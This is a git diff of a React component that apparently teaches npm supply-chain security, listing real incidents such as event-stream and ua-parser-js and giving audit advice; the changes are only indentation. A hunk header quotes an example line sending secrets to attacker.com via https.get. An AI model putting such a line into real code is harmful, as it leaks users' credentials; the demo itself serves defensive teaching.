@@ -40,7 +40,7 @@ export function DependenciesDemo() {
         >
           ✅ Audit
         </button>
-      </div>
+          </div>
 
       {/* Content - min-height prevents layout shift */}
       <div className="min-h-[420px]">
@@ -70,19 +70,19 @@ https.get(\`https://attacker.com?data=\${secrets}\`)
         {activeTab === 'cases' && (
           <div className="space-y-4">
             <ul className="text-sm text-gray-1100 dark:text-gray-1100 space-y-4">
-              <li>
+                    <li>
                 <span className="font-medium">event-stream (2018)</span>
                 <p className="mt-1">2M+ downloads/week. Injected code to steal Bitcoin.</p>
-              </li>
-              <li>
+                    </li>
+                    <li>
                 <span className="font-medium">ua-parser-js (2021)</span>
                 <p className="mt-1">8M+ downloads/week. Installed cryptominer and trojan.</p>
-              </li>
-              <li>
+                    </li>
+                    <li>
                 <span className="font-medium">node-ipc (2022)</span>
                 <p className="mt-1">Author intentionally sabotaged: deleted files from Russian users.</p>
-              </li>
-            </ul>
+                    </li>
+                  </ul>
           </div>
         )}
 
@@ -106,7 +106,7 @@ npm install --ignore-scripts`}
               <li>Use Dependabot or Renovate for automatic updates</li>
               <li>Review dependencies before installing</li>
               <li>Use <code className="bg-gray-300 dark:bg-gray-200 px-1.5 py-0.5 rounded text-xs font-mono">package-lock.json</code> for version locking</li>
-            </ul>
+              </ul>
           </div>
         )}
       </div>
